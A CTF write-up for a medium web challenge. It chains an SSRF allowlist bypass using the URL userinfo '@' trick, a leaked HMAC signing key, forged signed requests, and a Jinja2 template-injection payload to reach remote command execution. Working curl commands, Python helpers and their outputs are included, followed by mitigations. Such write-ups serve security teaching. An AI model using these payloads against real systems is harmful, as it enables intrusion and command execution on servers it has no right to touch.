# Dispatch — Web Exploitation Write-up

- **Challenge:** Dispatch — crafted by gopwnit
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Points:** 100
- **Target:** `http://52.66.248.135`

> **Description:** “VISIT US AT - http://52.66.248.135. Let us know if you can see what we do inside the dispatcher. Do not attack the captcha haha! lmao.”

## TL;DR

**Flag:** `CTF{p4rs3_th3_auth0r1ty_n0t_th3_us3r1nf0}`

The attack chain was four links, each one opening the door to the next:

1. **SSRF via a URL authority-parsing flaw** — the webhook tester's hostname allowlist is checked against the wrong part of the URL, so a userinfo `@` trick sends the request anywhere we want.
2. **Unauthenticated internal config endpoint** — the SSRF gives access to `dispatch-notifier.internal:9000`, whose `/v1/config` leaks the HMAC signing key in plaintext.
3. **Signed request forgery** — with the leaked `whsec_...` key we can forge valid `X-Dispatch-Signature` headers and call the mutating internal API.
4. **Jinja2 SSTI → RCE** — `POST /v1/notify/preview` renders arbitrary templates with autoescaping off; `{{ lipsum.__globals__.os.popen(...) }}` gives command execution and the flag.

The flag name confirms the root cause: parse the authority, not the userinfo.

## Table of Contents

1. [Recon](#1-recon)
2. [Mapping the Attack Surface](#2-mapping-the-attack-surface)
3. [The SSRF: Abusing URL Parsing](#3-the-ssrf-abusing-url-parsing)
4. [Inside the Internal Service](#4-inside-the-internal-service)
5. [Leaking the Signing Key](#5-leaking-the-signing-key)
6. [SSTI to RCE](#6-ssti-to-rce)
7. [Flag](#7-flag)
8. [Dead Ends Worth Noting](#8-dead-ends-worth-noting)
9. [Mitigations](#9-mitigations)
10. [Takeaways](#10-takeaways)

## 1. Recon

The target presents itself as **Dispatch** — webhook delivery for teams (`Server: gunicorn`, a Flask/Python stack). The landing page advertises three features that are effectively a challenge roadmap:

- Signed delivery using HMAC-SHA256
- Honest retries with a dead-letter queue
- A live tester that will “probe any approved integration endpoint with a real request and read the real response, headers and all”

That last sentence is the loudest SSRF hint possible: the service makes arbitrary outbound HTTP requests from its own network and shows you the response.

The `/docs` page adds two more critical details. First, there is a hostname allowlist of approved providers:

```text
hooks.slack.com
events.pagerduty.com
discord.com
api.github.com
api.twilio.com
webhook.example.com
```

Everything else is “refused before the request leaves our network.” Second, the docs casually mention that notification bodies are Jinja2 templates rendered by the delivery worker with autoescaping off — file that away for later; it becomes the RCE primitive.

## 2. Mapping the Attack Surface

Registration (`/register`) is open, so a throwaway account gives access to `/dashboard`, `/tester`, and `/deliveries`. Two things stand out immediately on the dashboard.

The delivery log shows system traffic to internal hosts. Among the relays to Slack, Discord, and PagerDuty there are requests like:

```text
GET  http://dispatch-notifier.internal:9000/v1/health        200  worker liveness probe
GET  http://dispatch-notifier.internal:9000/v1/queue         200  queue depth sample
POST http://dispatch-notifier.internal:9000/v1/notify/send   500  upstream template error, moved to dead letter
```

So `dispatch-notifier.internal:9000` is an internal-only API that renders notification templates. That is exactly “what we do inside the dispatcher” from the description.

The webhook tester (`/tester`) is a form that posts JSON to `/api/tester/probe`. The JavaScript is at `/static/js/tester.js`, which is worth reading. It accepts a method, URL, headers, and body. When a target is rejected, the server responds with the hostname it parsed plus the approved list. That turns the validator into an oracle:

```bash
curl -s -b cookies.txt \
  -X POST http://52.66.248.135/api/tester/probe \
  -H 'Content-Type: application/json' \
  -d '{"method":"GET","url":"http://dispatch-notifier.internal:9000/v1/health"}'
```

Response:

```json
{
  "rejected": true,
  "parsed_host": "dispatch-notifier.internal",
  "reason": "\"dispatch-notifier.internal\" is not an approved integration endpoint",
  "approved_hosts": [
    "hooks.slack.com",
    "events.pagerduty.com",
    "discord.com",
    "api.github.com",
    "api.twilio.com",
    "webhook.example.com"
  ]
}
```

Meanwhile, an approved host passes validation and the request actually goes out — and any transport error echoes the host the client really connected to:

```json
{
  "ok": false,
  "error": "ConnectionError: HTTPConnectionPool(host='webhook.example.com', port=80): ..."
}
```

The tester even forwards custom request headers, except `host`, `content-length`, `transfer-encoding`, `connection`, and `expect`, and shows the first 16 KiB of the response body. In other words: if we can get past the allowlist, we get a full read-back HTTP client against the internal network.

## 3. The SSRF: Abusing URL Parsing

The rejection message reveals `parsed_host`, which strongly suggests the validator parses the URL in a way that disagrees with whatever the HTTP client (`requests`/`urllib3`) eventually connects to.

The most classic divergence between a sloppy parser and a spec-compliant client is the userinfo component. Per RFC 3986, everything between `scheme://` and the host is `userinfo@host`. Therefore, in:

```text
http://hooks.slack.com@dispatch-notifier.internal:9000/v1/health
```

the authority's host is `dispatch-notifier.internal`, and `hooks.slack.com` is merely user information. If the validator grabs the wrong substring — effectively “the thing right after `://`” — it sees an approved provider, while `requests` correctly connects to the host after the `@`.

```bash
curl -s -b cookies.txt \
  -X POST http://52.66.248.135/api/tester/probe \
  -H 'Content-Type: application/json' \
  -d '{"method":"GET","url":"http://hooks.slack.com@dispatch-notifier.internal:9000/v1/health"}'
```

Response:

```json
{
  "ok": true,
  "status": 200,
  "duration_ms": 2,
  "headers": {
    "Content-Type": "application/json"
  },
  "body": "{\"status\":\"ok\",\"uptime_s\":3514.9}"
}
```

This provides full SSRF with response read-back. The response body is relayed straight into the browser — a perfect tunnel into the internal network.

## 4. Inside the Internal Service

With the tunnel established, enumeration is easy. `GET /` on the internal host returns a helpful 404:

```json
{
  "error": "not_found",
  "hint": "GET /v1/ lists available endpoints"
}
```

`GET /v1/` does exactly that:

```json
{
  "endpoints": {
    "GET /v1/": "this index",
    "GET /v1/config": "effective worker configuration (unauthenticated, internal only)",
    "GET /v1/health": "liveness probe (unauthenticated)",
    "GET /v1/queue": "pending notification queue depth (unauthenticated)",
    "POST /v1/notify/preview": "render a notification template without delivering it (signed)",
    "POST /v1/notify/send": "queue a notification for delivery (signed)"
  },
  "service": "dispatch-notifier",
  "version": "2.14.3"
}
```

Three details matter here:

- `/v1/config` is explicitly unauthenticated.
- `POST /v1/notify/preview` renders a template and is only protected by a signature.
- The challenge author thought it was fine to leave all of this reachable from the webhook worker.

## 5. Leaking the Signing Key

`GET /v1/config`, still through the SSRF tunnel, returns the effective configuration — including everything we need:

```json
{
  "listen": "0.0.0.0:9000",
  "signature_algorithm": "hmac-sha256-over-raw-body",
  "signature_header": "X-Dispatch-Signature",
  "signing_key": "whsec_7Qd1nR4kLpZ2vXy8aT6mJ0sEbW3cHfGu",
  "template_autoescape": false,
  "template_engine": "jinja2",
  "version": "2.14.3"
}
```

That is the shared HMAC secret used by the mutating endpoints, plus confirmation that templates render with Jinja2 and autoescaping disabled. The trust boundary is now gone: we hold the key, so we can impersonate the dispatcher itself.

## 6. SSTI to RCE

The signature scheme is documented in `/docs` and re-confirmed by the service when you forget the header:

```text
X-Dispatch-Signature: sha256=<hex HMAC-SHA256 of the raw request body,
                            keyed with the tenant signing key>
```

So we sign the exact body bytes with the leaked key and POST them to `/v1/notify/preview`. First, a sanity check proves both the signature and the template engine:

```python
import hashlib
import hmac
import json

KEY = b"whsec_7Qd1nR4kLpZ2vXy8aT6mJ0sEbW3cHfGu"
body = json.dumps({"template": "hello {{ 1+1 }}"})
sig = hmac.new(KEY, body.encode(), hashlib.sha256).hexdigest()

probe(
    "POST",
    "http://hooks.slack.com@dispatch-notifier.internal:9000/v1/notify/preview",
    headers=(
        f"X-Dispatch-Signature: sha256={sig}\n"
        "Content-Type: application/json"
    ),
    body=body,
)

# -> {"ok": true, "status": 200, "body":
#     "{\"bytes\":7,\"engine\":\"jinja2\",\"rendered\":\"hello 2\"}"}
```

The rendered result is `hello 2`, proving that the template is evaluated server-side.

Two gotchas matter:

- The JSON body must include `Content-Type: application/json`; a form-encoded body produces `'template' must be a string`.
- The HMAC must be computed over the raw string exactly as sent, because that is what the service verifies.

Now escalate from arithmetic to code execution. `lipsum` is a Jinja2 global whose `__globals__` namespace lives in `jinja2.utils`, which imports `os` — a well-known path from template variables to the Python runtime:

```python
def run_cmd(cmd):
    template = "{{ lipsum.__globals__.os.popen(%s).read() }}" % json.dumps(cmd)
    body = json.dumps({"template": template})
    sig = hmac.new(KEY, body.encode(), hashlib.sha256).hexdigest()

    return probe(
        "POST",
        INTERNAL + "/v1/notify/preview",
        headers=(
            f"X-Dispatch-Signature: sha256={sig}\n"
            "Content-Type: application/json"
        ),
        body=body,
    )


run_cmd("ls -la /")
```

The command works, and there it is:

```text
-r--r--r--   1 root root   42 Oct  8 09:55 flag.txt
```

## 7. Flag

```python
run_cmd("cat /flag.txt")
```

Response:

```json
{
  "ok": true,
  "status": 200,
  "body": "{\"bytes\":42,\"engine\":\"jinja2\",\"rendered\":\"CTF{p4rs3_th3_auth0r1ty_n0t_th3_us3r1nf0}\\n\"}"
}
```

```text
CTF{p4rs3_th3_auth0r1ty_n0t_th3_us3r1nf0}
```

## 8. Dead Ends Worth Noting

Not every candidate bypass worked — the validator may be sloppy, but it is not that sloppy. The following payloads were rejected or useless:

- **Trailing dot:** `hooks.slack.com.`
- **IDNA dot:** `hooks%E3%80%82slack.com`
- **Suffix/spoofed subdomains:** refused.
- **CRLF/tab injection:** `%0a`, `%0d`, and `%09` in the userinfo or host position were refused.
- **Double `@`:** `http://hooks.slack.com@@dispatch-notifier.internal:9000/` passed validation and returned 200, but `requests` treats the extra `@` as part of the userinfo, so it lands on the same internal host as the primary payload. It is redundant rather than a distinct bypass.
- **Reversed userinfo:** `http://dispatch-notifier.internal:9000@hooks.slack.com/` and other malformed variants triggered a 400 from the outer app before the validator even ran. Keep the payload well-formed.
- **Redirect-based pivots:** pre-blocked; the docs state redirects are not followed, and the response preview showed a bare 308 to `/v1/` rather than following it.
- **Unsigned notification request:** `POST /v1/notify/send` without a signature returns `401 invalid_signature`. The signature check is real, which is why leaking `/v1/config` was the necessary middle step of the chain.

## 9. Mitigations

Each link in the chain has a clean fix; breaking any single one kills the exploit.

### Parse the Authority, Not the Userinfo

Extract the hostname with a spec-compliant parser and reject anything suspicious. In Python, `urllib.parse.urlparse(url).hostname` returns exactly what the client will connect to.

Compare the hostname case-insensitively and exactly against the allowlist. Hard-reject any URL whose `netloc` contains `@`, whitespace, control characters, or a non-standard port.

Even better, resolve the parsed host and validate the IP address at connection time, pinning the connection to what was validated. Alternatively, use a proxy or egress firewall keyed on allowlisted domains.

### Keep Secrets Away from Untrusted Components

The `/v1/config` endpoint printed the shared signing key to any caller who could reach the service, and the webhook tester could reach it by design.

Configuration endpoints belong behind loopback and network policy. The worker should be internal-only by firewall rule, not convention, and configuration endpoints must never return signing keys. Rotate the leaked key.

### Sandbox Template Rendering

`POST /v1/notify/preview` renders fully expressive Jinja2 with autoescaping off and no `SandboxedEnvironment`.

Use `jinja2.sandbox.SandboxedEnvironment`, render from fixed templates with variable substitution instead of raw template strings, and treat tenant-supplied text as data rather than code.

### Add Defense in Depth to the Tester

Deny private, loopback, and link-local ranges, as well as `.internal` DNS names, at the network layer. This ensures that a validator bug cannot become an internal request. Rate-limit and log probes separately from real deliveries.

## 10. Takeaways

- **Hostname validation is only as good as your URL parser.** The `user@host` trick is decades old and still wins whenever the validator greps the URL instead of parsing the authority. If you implement an allowlist, derive the hostname from the same parser the HTTP client uses — and prefer IP-level egress controls underneath.
- **“Internal only” is not an authentication strategy.** The moment an SSRF exists, everything reachable from the worker is effectively public. The config endpoint handing over a signing key converted a read primitive into a full forge-and-execute chain.
- **Chains beat single bugs.** Individually, each finding — SSRF, information leak, and SSTI — is a Medium-severity issue. Strung together, they become unauthenticated RCE. Fixing any layer — parser, config exposure, or sandbox — would have broken the kill chain, which is why layered defenses matter.
- **Feedback oracles accelerate exploitation.** The validator echoing `parsed_host` and the tester echoing transport errors made the parsing discrepancy obvious within a handful of requests. Error messages should not disclose more than necessary.
